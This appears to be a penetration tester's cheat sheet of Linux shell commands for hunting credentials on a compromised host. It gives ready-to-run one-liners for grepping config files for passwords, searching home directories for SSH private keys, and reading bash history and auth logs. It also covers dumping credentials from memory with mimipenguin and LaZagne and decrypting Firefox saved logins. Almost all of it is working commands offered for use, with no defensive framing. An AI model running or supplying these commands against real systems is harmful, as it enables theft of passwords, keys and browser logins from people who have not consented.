#linux/auth/creds-hunting

# Conf files
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
# Databases
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

# Notes
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

# Scripts
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

# Cronjobs
```bash
cat /etc/crontab 

ls -la /etc/cron.*/
```

# SSH
```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

# History
```bash
tail -n5 /home/*/.bash*

for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

# Memory and Cache
https://github.com/huntergregal/mimipenguin
### Memory
```bash
sudo python3 mimipenguin.py
```
or
```bash
sudo bash mimipenguin.sh 
```
or
```bash
sudo python2.7 laZagne.py all
```

# Browsers
```bash
ls -l .mozilla/firefox/ | grep default 

cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
https://github.com/unode/firefox_decrypt
```bash
python3.9 firefox_decrypt.py
```